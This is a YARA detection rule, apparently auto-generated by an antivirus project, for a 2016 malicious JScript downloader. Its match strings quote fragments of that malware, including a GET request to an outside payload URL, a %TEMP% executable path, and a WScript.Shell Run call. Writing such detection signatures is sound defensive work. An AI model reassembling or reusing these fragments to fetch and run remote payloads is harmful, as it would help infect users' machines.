rule sig_20160329_3d79b64931fcf8fa9f1c049615d02a88 {
  meta:
    description = "datamaliciousorder - file 20160329_3d79b64931fcf8fa9f1c049615d02a88.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a8023168845372eb4e8d3fe66a7aa9b917f171eca6ace6ea1a83f3b747542fc"

  strings:
    $s1  = "function l() {return G[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RwqlPUlYpV.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[x](JQ() * 11); if (bP[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function iV(dE, TH){R = R * 1; return dE - TH;};" fullword ascii
    $s4  = "bP[l0](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s5  = "var G = function a() {return WScript[N](\"WScript.Shell\");}(), D0 = 11;" fullword ascii
    $s6  = "function HI(){return \"\" + C;};" fullword ascii
    $s7  = "function Rd() {return ((k == true) && (k == SA)) ? 1 : R;};" fullword ascii
    $s8  = "function D(O){G[\"Run\"](O, R, R);};" fullword ascii
    $s9  = "function lH(){return N;};" fullword ascii
    $s10 = "return iV(w, n);" fullword ascii
    $s11 = " while (J){" fullword ascii
    $s12 = "function JQ(){return 22;};" fullword ascii
    $s13 = "var R1 = new this[\"Date\"]();" fullword ascii
    $s14 = "function a0()" fullword ascii
    $s15 = "function f(ZY) {var Kl = (1, 2, 3, 4, 5, ZY); return Kl;};" fullword ascii
    $s16 = "var k = false;" fullword ascii
    $s17 = "k = true; " fullword ascii
    $s18 = "var B = false;" fullword ascii
    $s19 = "var SA = false;" fullword ascii
    $s20 = "SA = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}